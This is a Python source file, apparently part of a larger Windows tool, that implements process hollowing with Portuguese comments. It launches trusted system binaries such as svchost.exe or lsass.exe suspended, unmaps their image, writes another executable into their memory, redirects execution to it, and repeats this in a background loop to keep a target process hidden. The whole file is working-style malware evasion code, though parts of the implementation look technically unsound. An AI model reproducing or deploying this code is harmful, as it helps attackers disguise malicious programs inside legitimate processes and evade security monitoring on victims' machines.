# core/loader.py
import ctypes
import os
import json
import time
import psutil  # Precisamos instalar esta biblioteca
import threading

try:
    from core import winapi_ctypes as winapi
    print("[*] Usando implementação ctypes")
except ImportError as e:
    print(f"[!] Erro ao carregar winapi: {e}")
    exit(1)

# Carrega a DLL compilada do Rust
try:
    dll_path = os.path.abspath("core/rust_loader/target/release/rust_loader.dll")
    rust = ctypes.CDLL(dll_path)
    
    rust.parse_pe.argtypes = [ctypes.c_char_p]
    rust.parse_pe.restype = ctypes.c_char_p
    
    rust.free_str.argtypes = [ctypes.c_char_p]
    rust.free_str.restype = None
except Exception as e:
    print(f"[!] Erro ao carregar DLL Rust: {e}")
    rust = None

# Variável global para controlar o loop
_hollowing_active = False
_hollowing_thread = None

def get_pe_info(target_path):
    """Obtém informações do PE usando Rust ou fallback Python"""
    if rust:
        try:
            msg_ptr = rust.parse_pe(target_path.encode("utf-8"))
            msg = ctypes.cast(msg_ptr, ctypes.c_char_p).value.decode("utf-8")
            rust.free_str(msg_ptr)
            
            # Tentar parsear como JSON
            try:
                return json.loads(msg)
            except json.JSONDecodeError:
                # Fallback se não for JSON
                return {
                    "image_base": 0x400000,
                    "entry_point": 0x1000,
                    "size_of_image": 0x100000,
                    "message": msg
                }
        except Exception as e:
            print(f"[!] Erro ao parsear PE com Rust: {e}")
    
    # Fallback para valores padrão
    return {
        "image_base": 0x400000,
        "entry_point": 0x1000,
        "size_of_image": 0x100000,
        "message": "Usando valores padrão (fallback)"
    }

def is_process_running(process_name):
    """Verifica se um processo está em execução"""
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == process_name.lower():
            return True
    return False

def hide_process(target_process):
    """Tenta esconder um processo específico"""
    target_name = os.path.basename(target_process)
    print(f"[*] Tentando esconder processo: {target_name}")
    
    # Lista de processos hospedeiros comuns
    host_candidates = [
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\winlogon.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\services.exe",
        "C:\\Windows\\System32\\spoolsv.exe"
    ]
    
    for host in host_candidates:
        if os.path.exists(host):
            print(f"[*] Tentando hollowing com host: {os.path.basename(host)}")
            if run_hollowing(target_process, host):
                return True
            time.sleep(2)  # Espera entre tentativas
    
    return False

def run_hollowing(target: str, host: str):
    print(f"[*] Tentando hollowing: {os.path.basename(target)} -> {os.path.basename(host)}")

    # 1. Validar se arquivos existem
    if not os.path.exists(target):
        print(f"[!] Arquivo alvo não encontrado: {target}")
        return False
    
    if not os.path.exists(host):
        print(f"[!] Arquivo host não encontrado: {host}")
        return False

    # 2. Criar processo suspenso
    if not winapi.create_suspended_process(host):
        print("[!] Falha ao criar processo suspenso")
        return False

    # 3. Obter informações do PE alvo
    pe_info = get_pe_info(target)
    print(f"[*] Informações do PE: {pe_info.get('message', 'N/A')}")
    
    image_base = pe_info.get("image_base", 0x400000)
    entry_point = pe_info.get("entry_point", 0x1000)
    size_of_image = pe_info.get("size_of_image", 0x100000)

    # 4. Obter contexto do thread
    context = winapi.get_thread_context()
    if not context:
        print("[!] Falha ao obter contexto do thread")
        winapi.resume_process()  # Tentar limpar
        return False

    print(f"[*] Contexto obtido: EAX=0x{context['Eax']:X}, EIP=0x{context['Eip']:X}")

    # 5. Desmapear a imagem original do processo host
    process_handle = winapi.get_process_handle()
    if process_handle and context['Eax'] != 0:
        print(f"[*] Desmapeando imagem original em: 0x{context['Eax']:X}")
        if not winapi.nt_unmap_view_of_section(process_handle, context['Eax']):
            print("[!] Falha ao desmapear imagem original (pode ser normal para alguns processos)")

    # 6. Alocar memória no endereço desejado
    new_image_base = winapi.virtual_alloc_ex(size_of_image, image_base)
    if not new_image_base:
        print("[!] Falha ao alocar memória no processo")
        winapi.resume_process()
        return False

    print(f"[*] Memória alocada em: 0x{new_image_base:X}")

    # 7. Carregar e escrever o PE completo
    try:
        with open(target, "rb") as f:
            pe_data = f.read()
        
        print(f"[*] Escrevendo {len(pe_data)} bytes na memória...")
        
        if winapi.write_process_memory(new_image_base, pe_data):
            print("[*] Dados do PE escritos com sucesso")
        else:
            print("[!] Falha ao escrever dados do PE")
            winapi.virtual_free_ex(new_image_base)
            winapi.resume_process()
            return False
    except Exception as e:
        print(f"[!] Erro ao ler arquivo PE: {e}")
        winapi.virtual_free_ex(new_image_base)
        winapi.resume_process()
        return False

    # 8. Modificar contexto para apontar para o novo EntryPoint
    original_context = context.copy()
    context['Eax'] = new_image_base + entry_point  # Novo EntryPoint
    
    print(f"[*] Modificando contexto: EAX=0x{context['Eax']:X}")

    if winapi.set_thread_context(context):
        print("[*] Contexto modificado com sucesso")
    else:
        print("[!] Falha ao modificar contexto, restaurando original...")
        winapi.set_thread_context(original_context)
        winapi.virtual_free_ex(new_image_base)
        winapi.resume_process()
        return False

    # 9. Retomar execução
    if winapi.resume_process():
        print("[*] Processo retomado com sucesso!")
        print("[*] Hollowing completo - processo deve estar oculto")
        return True
    else:
        print("[!] Falha ao retomar processo")
        winapi.virtual_free_ex(new_image_base)
        return False

def start_continuous_hollowing(target_process, check_interval=5):
    """Inicia o hollowing contínuo em background"""
    global _hollowing_active, _hollowing_thread
    
    def hollowing_loop():
        global _hollowing_active
        target_name = os.path.basename(target_process)
        
        print(f"[*] Iniciando hollowing contínuo para: {target_name}")
        print(f"[*] Verificando a cada {check_interval} segundos")
        
        while _hollowing_active:
            try:
                # Verifica se o processo alvo está visível
                if is_process_running(target_name):
                    print(f"[*] Processo {target_name} detectado, tentando esconder...")
                    if hide_process(target_process):
                        print(f"[*] Processo {target_name} escondido com sucesso!")
                    else:
                        print(f"[!] Falha ao esconder {target_name}")
                else:
                    print(f"[*] Processo {target_name} não está visível ✓")
                
                time.sleep(check_interval)
                
            except Exception as e:
                print(f"[!] Erro no loop de hollowing: {e}")
                time.sleep(check_interval)
    
    _hollowing_active = True
    _hollowing_thread = threading.Thread(target=hollowing_loop, daemon=True)
    _hollowing_thread.start()
    
    return True

def stop_continuous_hollowing():
    """Para o hollowing contínuo"""
    global _hollowing_active
    _hollowing_active = False
    print("[*] Hollowing contínuo parado")

def is_hollowing_active():
    """Verifica se o hollowing contínuo está ativo"""
    global _hollowing_active
    return _hollowing_active